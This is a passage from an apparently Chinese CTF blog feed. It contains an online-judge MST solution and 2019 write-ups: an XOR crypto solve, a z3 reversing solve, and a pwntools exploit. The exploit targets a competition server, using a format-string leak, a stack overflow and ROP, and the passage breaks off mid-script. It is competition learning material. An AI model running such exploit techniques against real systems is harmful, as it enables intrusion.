Input</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">1 2 1</span><br><span class="line">1 3 2</span><br><span class="line">2 3 4</span><br><span class="line">4</span><br><span class="line">1 2 1</span><br><span class="line">1 3 4</span><br><span class="line">1 4 1</span><br><span class="line">2 3 3</span><br><span class="line">2 4 2</span><br><span class="line">3 4 5</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>Sample Output</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">5</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">int</span> t1,t2,l;</span><br><span class="line">ll N,M;</span><br><span class="line">ll maxx=<span class="number">999999999</span>,sum;</span><br><span class="line">ll travel[<span class="number">501</span>][<span class="number">501</span>],dis[<span class="number">501</span>];</span><br><span class="line"><span class="keyword">bool</span> s[<span class="number">501</span>]=&#123;<span class="literal">false</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> u;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;N;<span class="comment">//&gt;&gt;M;</span></span><br><span class="line"><span class="keyword">if</span>(N==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">M=N*(N<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">fill(&amp;travel[<span class="number">0</span>][<span class="number">0</span>],&amp;travel[<span class="number">0</span>][<span class="number">0</span>]+<span class="number">501</span>*<span class="number">501</span>,maxx);</span><br><span class="line">fill(dis,dis+<span class="number">501</span>,maxx);</span><br><span class="line"><span class="built_in">memset</span>(s,<span class="literal">false</span>,<span class="number">501</span>);</span><br><span class="line">sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;M;++j)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;t1&gt;&gt;t2&gt;&gt;l;</span><br><span class="line">travel[t1][t2]=travel[t2][t1]=l;<span class="comment">//输入边权值</span></span><br><span class="line">&#125;</span><br><span class="line">dis[t1]=<span class="number">0</span>;<span class="comment">//随机选择t1作为起点</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=N;++j)&#123;</span><br><span class="line">u=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> minn=maxx;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i]==<span class="literal">false</span> &amp;&amp; dis[i]&lt;minn)</span><br><span class="line">&#123;minn=dis[i];</span><br><span class="line">u=i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(u == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">s[u]=<span class="literal">true</span>;</span><br><span class="line">sum+=dis[u];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;++i)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i]==<span class="literal">false</span> &amp;&amp; travel[u][i]!=maxx &amp;&amp; travel[u][i]&lt;dis[i])&#123;<span class="comment">//和dijkstra不一样的地方，如果从u到i可以更近，便舍弃从原点到i,不计算重复路径长度</span></span><br><span class="line">dis[i]=travel[u][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;# &lt;/p&gt;
&lt;h2 id=&quot;dijkstra&quot;&gt;&lt;a href=&quot;#dijkstra&quot; class=&quot;headerlink&quot; title=&quot;dijkstra&quot;&gt;&lt;/a&gt;dijkstra&lt;/h2&gt;&lt;p&gt;总结一下dijkstr算法的理解&lt;/p&gt;
&lt;p&gt;问题:&lt;/p&gt;
&lt;p&gt;A</summary>
      
    
    
    
    <category term="oj" scheme="http://pidanxu.github.io/categories/oj/"/>
    
    
    <category term="dijkstra" scheme="http://pidanxu.github.io/tags/dijkstra/"/>
    
  </entry>
  
  <entry>
    <title>de1ctf+suctf+第五空间+算法</title>
    <link href="http://pidanxu.github.io/2019/08/29/de1ctf-suctf-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-%E7%AE%97%E6%B3%95/"/>
    <id>http://pidanxu.github.io/2019/08/29/de1ctf-suctf-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-%E7%AE%97%E6%B3%95/</id>
    <published>2019-08-29T09:00:54.000Z</published>
    <updated>2019-08-29T12:24:06.193Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="de1ctf"><a href="#de1ctf" class="headerlink" title="de1ctf"></a>de1ctf</h1><p>xorz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> flag,plain</span><br><span class="line"></span><br><span class="line">key=flag.strip(<span class="string">"de1ctf&#123;"</span>).strip(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(key&lt;<span class="number">38</span>))</span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line">cipher = <span class="string">''</span>.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si)))[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="keyword">print</span> cipher</span><br></pre></td></tr></table></figure><p>因为密钥重复使用，所以猜测密钥长度后分组，密文分组异或=明文分组异或，利用空格异或字母大小写转换，可以确定明文的空格字符和对应的字符，逐步推出明文字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">cypher=<span class="string">'49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line">s1=cycle(salt)</span><br><span class="line">tmp=[ord(next(s1))^ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> cypher]</span><br><span class="line">k_len=<span class="number">30</span></span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> range(<span class="number">0</span>,len(tmp)<span class="number">-6</span>*k_len,k_len):</span><br><span class="line">    number = <span class="number">0</span></span><br><span class="line">    a1=tmp[count:k_len+count]</span><br><span class="line">    <span class="comment">#for i in range(k_len+count,tmp.len(),k_len):</span></span><br><span class="line">    <span class="string">'''     if(str.isalpha(chr(a6[i]^a1[i])) or a1[i]^a6[i]==0):</span></span><br><span class="line"><span class="string">        if (str.isalpha(chr(a2[i] ^ a6[i]))or a2[i]^a6[i]==0):</span></span><br><span class="line"><span class="string">            if (str.isalpha(chr(a3[i] ^ a6[i]))or a3[i]^a6[i]==0):</span></span><br><span class="line"><span class="string">                if (str.isalpha(chr(a4[i] ^ a6[i]))or a4[i]^a6[i]==0):</span></span><br><span class="line"><span class="string">                    if (str.isalpha(chr(a5[i] ^ a6[i])) or a5[i] ^ a6[i] == 0):</span></span><br><span class="line"><span class="string">                        print i,chr(a6[i])'''</span></span><br><span class="line">    a2 = tmp[count+k_len:<span class="number">2</span>*k_len+count]</span><br><span class="line">    a3 = tmp[count+<span class="number">2</span>*k_len:<span class="number">3</span>*k_len+count]</span><br><span class="line">    a4 = tmp[count+<span class="number">3</span>*k_len:<span class="number">4</span>*k_len+count]</span><br><span class="line">    a5 = tmp[count + <span class="number">4</span>*k_len:<span class="number">5</span> * k_len + count]</span><br><span class="line">    a6 = tmp[count + <span class="number">5</span>*k_len:<span class="number">6</span> * k_len + count]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a1)):</span><br><span class="line">        <span class="keyword">if</span> (str.isalpha(chr(a1[i] ^ a2[i])) <span class="keyword">or</span> a1[i] ^ a2[i] == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">if</span> (str.isalpha(chr(a1[i] ^ a3[i])) <span class="keyword">or</span> a1[i] ^ a3[i] == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">if</span> (str.isalpha(chr(a1[i] ^ a4[i])) <span class="keyword">or</span> a1[i] ^ a4[i] == <span class="number">0</span>):</span><br><span class="line">                    <span class="keyword">if</span> (str.isalpha(chr(a1[i] ^ a5[i])) <span class="keyword">or</span> a1[i] ^ a5[i] == <span class="number">0</span>):</span><br><span class="line">                        <span class="keyword">if</span> (str.isalpha(chr(a1[i] ^ a6[i])) <span class="keyword">or</span> a1[i] ^ a6[i] == <span class="number">0</span>):</span><br><span class="line">                            flag.append(str(i)+<span class="string">':'</span>+chr(a1[i]^ord(<span class="string">' '</span>)))</span><br><span class="line"><span class="keyword">print</span> list(set(flag))</span><br><span class="line"><span class="comment">#W3lc0m3tOjo1nu55un1ojOt3m0cl3W</span></span><br></pre></td></tr></table></figure><p>或者也可以用set集合，把每个明文可能的异或结果都记录，最后分组做&amp;操作（这是参考队里其他师傅的做法）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">cypher=<span class="string">'49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line">s1=cycle(salt)</span><br><span class="line">tmp=[ord(next(s1))^ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> cypher]</span><br><span class="line"><span class="comment">#print tmp</span></span><br><span class="line">sett=[set() <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>)]</span><br><span class="line">table=string.letters+string.digits+<span class="string">' .,\';'</span></span><br><span class="line"><span class="comment">#table=string.printable</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">        num=ord(i)^ord(j)</span><br><span class="line">        sett[num].add(i)</span><br><span class="line"><span class="keyword">for</span> k_len <span class="keyword">in</span> range(<span class="number">38</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k_len):</span><br><span class="line">        s=copy.deepcopy(sett[tmp[i]])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i,len(tmp),k_len):</span><br><span class="line">            s&amp;=sett[tmp[j]]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> len(s):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> (i==k_len<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">print</span> k_len</span><br><span class="line">k_len=<span class="number">30</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(k_len):</span><br><span class="line">    s = copy.deepcopy(sett[tmp[i]])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(i, len(tmp), k_len ):</span><br><span class="line">        s &amp;= sett[tmp[j]]</span><br><span class="line">    <span class="keyword">print</span> s,i</span><br></pre></td></tr></table></figure><h2 id="suctf"><a href="#suctf" class="headerlink" title="suctf"></a>suctf</h2><p>hardcpp</p><p>用了控制流平坦化和虚假指令，我是手撸的，但是找师傅要了去混淆的脚本，打算后面学习下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''def encry(a1,a2):</span></span><br><span class="line"><span class="string">return ((a1^18)*3+2)^(a2%7+a2)'''</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [BitVec(<span class="string">'flag[%d]'</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">21</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_models</span><span class="params">(s)</span>:</span></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="keyword">yield</span> m</span><br><span class="line">s.add(Or([sym() != m[sym] <span class="keyword">for</span> sym <span class="keyword">in</span> m.decls()]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(And((((flag[<span class="number">0</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">0</span>]%<span class="number">7</span>+flag[<span class="number">1</span>]))==<span class="number">0xf3</span>,</span><br><span class="line">(((flag[<span class="number">1</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">1</span>]%<span class="number">7</span>+flag[<span class="number">2</span>]))==<span class="number">0x2e</span>,</span><br><span class="line">(((flag[<span class="number">2</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">2</span>]%<span class="number">7</span>+flag[<span class="number">3</span>]))==<span class="number">0x18</span>,</span><br><span class="line">(((flag[<span class="number">3</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">3</span>]%<span class="number">7</span>+flag[<span class="number">4</span>]))==<span class="number">0x36</span>,</span><br><span class="line">(((flag[<span class="number">4</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">4</span>]%<span class="number">7</span>+flag[<span class="number">5</span>]))==<span class="number">0x0E1</span>,</span><br><span class="line">(((flag[<span class="number">5</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">5</span>]%<span class="number">7</span>+flag[<span class="number">6</span>]))==<span class="number">0x4C</span>,</span><br><span class="line">(((flag[<span class="number">6</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">6</span>]%<span class="number">7</span>+flag[<span class="number">7</span>]))==<span class="number">0x22</span>,</span><br><span class="line">(((flag[<span class="number">7</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">7</span>]%<span class="number">7</span>+flag[<span class="number">8</span>]))==<span class="number">0xD1</span>,</span><br><span class="line">(((flag[<span class="number">8</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">8</span>]%<span class="number">7</span>+flag[<span class="number">9</span>]))==<span class="number">0xF9</span>,</span><br><span class="line">(((flag[<span class="number">9</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">9</span>]%<span class="number">7</span>+flag[<span class="number">10</span>]))==<span class="number">0x8C</span>,</span><br><span class="line">(((flag[<span class="number">10</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">10</span>]%<span class="number">7</span>+flag[<span class="number">11</span>]))==<span class="number">0x40</span>,</span><br><span class="line">(((flag[<span class="number">11</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">11</span>]%<span class="number">7</span>+flag[<span class="number">12</span>]))==<span class="number">0x76</span>,</span><br><span class="line">(((flag[<span class="number">12</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">12</span>]%<span class="number">7</span>+flag[<span class="number">13</span>]))==<span class="number">0xF4</span>,</span><br><span class="line">(((flag[<span class="number">13</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">13</span>]%<span class="number">7</span>+flag[<span class="number">14</span>]))==<span class="number">0xe</span>,</span><br><span class="line">(((flag[<span class="number">14</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">14</span>]%<span class="number">7</span>+flag[<span class="number">15</span>]))==<span class="number">0x0</span>,</span><br><span class="line">(((flag[<span class="number">15</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">15</span>]%<span class="number">7</span>+flag[<span class="number">16</span>]))==<span class="number">0x5</span>,</span><br><span class="line">(((flag[<span class="number">16</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">16</span>]%<span class="number">7</span>+flag[<span class="number">17</span>]))==<span class="number">0xA3</span>,</span><br><span class="line">(((flag[<span class="number">17</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">17</span>]%<span class="number">7</span>+flag[<span class="number">18</span>]))==<span class="number">0x90</span>,</span><br><span class="line">(((flag[<span class="number">18</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">18</span>]%<span class="number">7</span>+flag[<span class="number">19</span>]))==<span class="number">0x0e</span>,</span><br><span class="line">(((flag[<span class="number">19</span>]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)^(flag[<span class="number">19</span>]%<span class="number">7</span>+flag[<span class="number">20</span>]))==<span class="number">0xA5</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">21</span>):</span><br><span class="line">s.add(And(<span class="number">0x20</span> &lt; flag[i], flag[i] &lt; <span class="number">0x7f</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> get_models(s):</span><br><span class="line">serial = [m[flag[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">21</span>)]</span><br><span class="line"></span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> serial: key += chr(_)</span><br><span class="line"><span class="keyword">print</span> key</span><br></pre></td></tr></table></figure><h3 id="第五空间"><a href="#第五空间" class="headerlink" title="第五空间"></a>第五空间</h3><p>被迫做了两道pwn</p><p>栈溢出覆盖seed，可以得到十次guess number，然后格式化字符串可以得到文件加载基址和cannary，最后构造rop就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"><span class="comment">#p=process('bf')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.4'</span>,<span class="number">50001</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'game?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">' : '</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">'%23$p'</span>+<span class="string">'%17$p'</span>+<span class="string">'a'</span>*<span class="number">18</span>+p64(<span class="number">0xDEADBEEF</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'guess:'</span>)</span><br><span class="line">p.sendline(<span class="string">'20580'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'guess:'</span>)</span><br><span class="line">p.sendline(<span class="string">'97396'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'guess:'</span>)</span><br><span class="line">p.sendline(<span class="string">'50168'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'guess:'</span>)</span><br><span class="line">p.sendline(<span class="string">'59152'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'guess:'</span>)</span><br><span class="line">p.sendline(<span class="string">'22838'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'guess:'</span>)</span><br><span class="line">p.sendline(<span class="string">'39971'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'guess:'</span>)</span><br><span class="line">p.sendline(<span class="string">'88926'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'guess:'</span>)</span><br><span class="line">p.sendline(<span class="string">'77090'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'guess:'</span>)</span><br><span class="line">p.sendline(<span class="string">'32494'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'guess:'</span>)</span><br><span class="line">p.sendline(<span class="string">'86846'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Correct!'</span>)</span><br><span class="line">a=p.recv()</span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line">log.success(a[<span class="number">17</span>:<span 